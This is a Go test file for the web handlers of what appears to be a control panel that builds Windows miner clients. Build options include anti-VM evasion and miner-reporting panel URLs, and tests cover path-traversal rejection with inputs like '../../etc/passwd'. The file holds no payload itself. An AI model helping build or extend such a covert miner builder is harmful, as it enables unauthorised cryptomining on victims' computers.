package handlers

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestSanitizeBuildName(t *testing.T) {
	tests := map[string]string{
		"":                 "",
		"corvus.exe":       "corvus.exe",
		"../../etc/passwd": "passwd.exe",
		"my build (1).exe": "mybuild1.exe",
		"build.EXE":        "build.EXE",
		"..":               "",
		"corvus_123.456":   "corvus_123.456.exe",
	}
	for in, want := range tests {
		if got := sanitizeBuildName(in); got != want {
			t.Errorf("sanitizeBuildName(%q) = %q, want %q", in, got, want)
		}
	}
}

// newTestHandler creates a fake repo layout:
//
//	root/builder          (fake executable)
//	root/Panel            (baseDir)
//	root/Client           (source tree)
func newTestHandler(t *testing.T, script string) (*Handler, string) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("fake builder script requires a POSIX shell")
	}

	root := t.TempDir()
	panelDir := filepath.Join(root, "Panel")
	clientDir := filepath.Join(root, "Client")
	dirs := []string{
		panelDir,
		filepath.Join(panelDir, "templates"),
		filepath.Join(panelDir, "static", "builds"),
		filepath.Join(clientDir, "src"),
	}
	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	for _, f := range []string{"CMakeLists.txt", filepath.Join("src", "main.cpp")} {
		if err := os.WriteFile(filepath.Join(clientDir, f), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	builder := filepath.Join(root, "builder")
	if err := os.WriteFile(builder, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}

	return NewHandler(nil, panelDir), root
}

func TestBuildMinerRunsBuilderAndPublishesArtifact(t *testing.T) {
	argsFile := filepath.Join(t.TempDir(), "args.txt")
	script := fmt.Sprintf(`#!/bin/sh
out=""; name="corvus.exe"
while [ $# -gt 0 ]; do
  case "$1" in
    -output) out="$2"; shift 2;;
    -name) name="$2"; shift 2;;
    *) echo "$1" >> %q; shift;;
  esac
done
mkdir -p "$out"
printf 'MZfake' > "$out/$name"
printf '{"success":true,"output":"%%s/%%s","bytes":6,"sha256":"deadbeef","duration_ms":7,"warnings":["note"]}' "$out" "$name"
`, argsFile)

	h, root := newTestHandler(t, script)

	body := `{"panel_urls":"https://panel.example.com/api/miners/submit","anti_vm":true,"debug_console":true,"file_name":"test-client","embedded_mode":"none"}`
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
	h.BuildMiner(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatalf("invalid JSON response: %v", err)
	}
	if resp["success"] != true {
		t.Fatalf("success = %v (%v)", resp["success"], resp["error"])
	}
	if resp["file"] != "test-client.exe" {
		t.Errorf("file = %v, want test-client.exe", resp["file"])
	}
	if resp["url"] != "/static/builds/test-client.exe" {
		t.Errorf("url = %v", resp["url"])
	}

	artifact := filepath.Join(root, "Panel", "static", "builds", "test-client.exe")
	if data, err := os.ReadFile(artifact); err != nil || string(data) != "MZfake" {
		t.Fatalf("artifact missing or wrong: %v %q", err, data)
	}

	args, err := os.ReadFile(argsFile)
	if err != nil {
		t.Fatalf("builder arguments were not recorded: %v", err)
	}
	for _, want := range []string{"-panel-urls", "https://panel.example.com/api/miners/submit", "-antivm", "-debug", "-json", "-source", "-cpu-miner=true", "-gpu-miner=false"} {
		if !strings.Contains(string(args), want) {
			t.Errorf("builder was not called with %q; got:\n%s", want, args)
		}
	}
}

func TestBuildMinerReportsBuilderFailure(t *testing.T) {
	script := `#!/bin/sh
out=""; name="corvus.exe"
while [ $# -gt 0 ]; do
  case "$1" in
    -output) out="$2"; shift 2;;
    -name) name="$2"; shift 2;;
    *) shift;;
  esac
done
mkdir -p "$out"
printf 'partial artifact' > "$out/$name"
printf '{"success":false,"error":"compile exploded"}'
printf 'some compiler output' >&2
exit 1
`
	h, root := newTestHandler(t, script)

	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(`{"panel_urls":"https://p.example/api/miners/submit","embedded_mode":"none"}`))
	h.BuildMiner(rec, req)

	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want 500", rec.Code)
	}
	var resp map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["error"] != "compile exploded" {
		t.Errorf("error = %v", resp["error"])
	}
	if !strings.Contains(fmt.Sprint(resp["output"]), "some compiler output") {
		t.Errorf("output tail missing: %v", resp["output"])
	}

	entries, err := os.ReadDir(filepath.Join(root, "Panel", "static", "builds"))
	if err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Errorf("a failed build must not leave an artifact behind, found %d", len(entries))
	}
}

func TestBuildMinerValidation(t *testing.T) {
	h, _ := newTestHandler(t, "#!/bin/sh\nexit 0\n")

	cases := []struct {
		name string
		body string
	}{
		{"no config source", `{}`},
		{"no miner", `{"panel_urls":"https://p.example/api/miners/submit","cpu_miner":false}`},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rec := httptest.NewRecorder()
			req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(tc.body))
			h.BuildMiner(rec, req)
			if rec.Code != http.StatusBadRequest {
				t.Errorf("status = %d, want 400 (%s)", rec.Code, rec.Body.String())
			}
		})
	}
}

func TestListAndDeleteBuilds(t *testing.T) {
	h, root := newTestHandler(t, "#!/bin/sh\nexit 0\n")
	buildsDir := filepath.Join(root, "Panel", "static", "builds")
	if err := os.WriteFile(filepath.Join(buildsDir, "a.exe"), []byte("aaa"), 0o644); err != nil {
		t.Fatal(err)
	}

	rec := httptest.NewRecorder()
	h.ListBuilds(rec, httptest.NewRequest(http.MethodGet, "/api/builds", nil))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d", rec.Code)
	}
	var builds []BuildFile
	if err := json.Unmarshal(rec.Body.Bytes(), &builds); err != nil {
		t.Fatal(err)
	}
	if len(builds) != 1 || builds[0].Name != "a.exe" || builds[0].URL != "/static/builds/a.exe" {
		t.Fatalf("unexpected builds: %+v", builds)
	}

	rec = httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/builds/delete", strings.NewReader(`{"filename":"a.exe"}`))
	req.Header.Set("Content-Type", "application/json")
	h.DeleteBuild(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("delete status = %d (%s)", rec.Code, rec.Body.String())
	}
	if _, err := os.Stat(filepath.Join(buildsDir, "a.exe")); !os.IsNotExist(err) {
		t.Error("file was not deleted")
	}

	// Directory traversal must be rejected.
	rec = httptest.NewRecorder()
	req = httptest.NewRequest(http.MethodPost, "/api/builds/delete", strings.NewReader(`{"filename":"../panel.exe"}`))
	req.Header.Set("Content-Type", "application/json")
	h.DeleteBuild(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Errorf("traversal status = %d, want 400", rec.Code)
	}
}

func TestBuilderPageRenders(t *testing.T) {
	h, root := newTestHandler(t, "#!/bin/sh\nexit 0\n")
	buildsDir := filepath.Join(root, "Panel", "static", "builds")
	if err := os.WriteFile(filepath.Join(buildsDir, "corvus_1.exe"), []byte("abc"), 0o644); err != nil {
		t.Fatal(err)
	}

	// Use the real layout/template when available so the test also covers the nav.
	for _, name := range []string{"layout.html", "builder.html"} {
		src, err := os.ReadFile(filepath.Join("..", "templates", name))
		if err != nil {
			t.Skipf("%s not reachable from the test working directory", name)
		}
		if err := os.WriteFile(filepath.Join(root, "Panel", "templates", name), src, 0o644); err != nil {
			t.Fatal(err)
		}
	}

	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodGet, "/builder", nil)
	req.Host = "panel.example.com"
	h.BuilderPage(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	for _, want := range []string{"Client Builder", "http://panel.example.com/api/miners/submit", "corvus_1.exe", "Build client"} {
		if !strings.Contains(body, want) {
			t.Errorf("page is missing %q", want)
		}
	}
}

func TestResolveBackendWindowsUsesPowerShell(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake POSIX script")
	}
	h, root := newTestHandler(t, "#!/bin/sh\nexit 0\n")

	script := filepath.Join(root, "Builder", "build.ps1")
	if err := os.MkdirAll(filepath.Dir(script), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(script, []byte("# fake"), 0o644); err != nil {
		t.Fatal(err)
	}

	bin := t.TempDir()
	if err := os.WriteFile(filepath.Join(bin, "powershell.exe"), []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv("CORVUS_BUILDER", "")

	old := hostGOOS
	hostGOOS = "windows"
	defer func() { hostGOOS = old }()

	backend, err := h.resolveBackend()
	if err != nil {
		t.Fatalf("resolveBackend: %v", err)
	}
	if backend.kind != "powershell" {
		t.Fatalf("kind = %q, want powershell", backend.kind)
	}
	if backend.script != script {
		t.Errorf("script = %q, want %q", backend.script, script)
	}
}

func TestResolveBackendEnvForcesCLI(t *testing.T) {
	h, root := newTestHandler(t, "#!/bin/sh\nexit 0\n")
	t.Setenv("CORVUS_BUILDER", filepath.Join(root, "builder"))

	old := hostGOOS
	hostGOOS = "windows"
	defer func() { hostGOOS = old }()

	backend, err := h.resolveBackend()
	if err != nil {
		t.Fatalf("resolveBackend: %v", err)
	}
	if backend.kind != "cli" {
		t.Errorf("kind = %q, want cli when CORVUS_BUILDER is set", backend.kind)
	}
}

func TestBuildMinerUsesPowerShellSpec(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("fake POSIX script")
	}
	h, root := newTestHandler(t, "#!/bin/sh\nexit 0\n")

	script := filepath.Join(root, "Builder", "build.ps1")
	if err := os.MkdirAll(filepath.Dir(script), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(script, []byte("# fake"), 0o644); err != nil {
		t.Fatal(err)
	}

	specOut := filepath.Join(t.TempDir(), "spec.json")
	t.Setenv("SPEC_OUT", specOut)

	bin := t.TempDir()
	fakeShell := `#!/bin/sh
while [ $# -gt 0 ]; do
  case "$1" in
    -panel_config) cfg="$2"; shift 2;;
    *) shift;;
  esac
done
cp "$cfg" "$SPEC_OUT"
printf '{"success":true,"output":"/tmp/x/corvus.exe","bytes":3,"sha256":"abc","duration_ms":5,"warnings":["note"]}'
`
	if err := os.WriteFile(filepath.Join(bin, "powershell.exe"), []byte(fakeShell), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", bin+string(os.PathListSeparator)+os.Getenv("PATH"))
	t.Setenv("CORVUS_BUILDER", "")

	old := hostGOOS
	hostGOOS = "windows"
	defer func() { hostGOOS = old }()

	body := `{"panel_urls":"https://p.example/api/miners/submit","anti_vm":true,"embedded_mode":"none","file_name":"win-client"}`
	rec := httptest.NewRecorder()
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
	h.BuildMiner(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["success"] != true || resp["file"] != "win-client.exe" {
		t.Fatalf("unexpected response: %v", resp)
	}

	data, err := os.ReadFile(specOut)
	if err != nil {
		t.Fatalf("build.ps1 was not invoked with a readable spec: %v", err)
	}
	var spec map[string]any
	if err := json.Unmarshal(data, &spec); err != nil {
		t.Fatalf("spec is not valid JSON: %v", err)
	}
	if spec["panel_urls"] != "https://p.example/api/miners/submit" {
		t.Errorf("panel_urls = %v", spec["panel_urls"])
	}
	if spec["anti_vm"] != true {
		t.Errorf("anti_vm = %v", spec["anti_vm"])
	}
	if spec["embedded_config"] != "none" {
		t.Errorf("embedded_config = %v, want none", spec["embedded_config"])
	}
	if spec["cpu_miner"] != true || spec["gpu_miner"] != false {
		t.Errorf("miner flags = cpu:%v gpu:%v", spec["cpu_miner"], spec["gpu_miner"])
	}
	if spec["name"] != "win-client.exe" {
		t.Errorf("name = %v", spec["name"])
	}
	if spec["output"] == "" || spec["source"] == "" {
		t.Errorf("output/source missing: %v / %v", spec["output"], spec["source"])
	}
}

// TestBuildMinerRealBuilder exercises the panel endpoint against the real CLI
// builder and the real client sources. It is slow and only runs when
// CORVUS_BUILDER_E2E=1 is set.
func TestBuildMinerRealBuilder(t *testing.T) {
	if os.Getenv("CORVUS_BUILDER_E2E") == "" {
		t.Skip("set CORVUS_BUILDER_E2E=1 to run the real cross-compilation")
	}

	repoRoot, err := filepath.Abs("../..")
	if err != nil {
		t.Fatal(err)
	}
	h := NewHandler(nil, filepath.Join(repoRoot, "Panel"))

	rec := httptest.NewRecorder()
	body := `{"panel_urls":"https://panel.example.com/api/miners/submit","cpu_miner":true,"embedded_mode":"none"}`
	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
	h.BuildMiner(rec, req)

	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.String())
	}

	var resp struct {
		Success bool   `json:"success"`
		File    string `json:"file"`
		Bytes   int64  `json:"bytes"`
		SHA256  string `json:"sha256"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if !resp.Success || resp.Bytes < 1<<20 || len(resp.SHA256) != 64 {
		t.Fatalf("unexpected result: %+v", resp)
	}

	artifact := filepath.Join(repoRoot, "Panel", "static", "builds", resp.File)
	if _, err := os.Stat(artifact); err != nil {
		t.Fatalf("artifact missing: %v", err)
	}
	os.Remove(artifact)
}
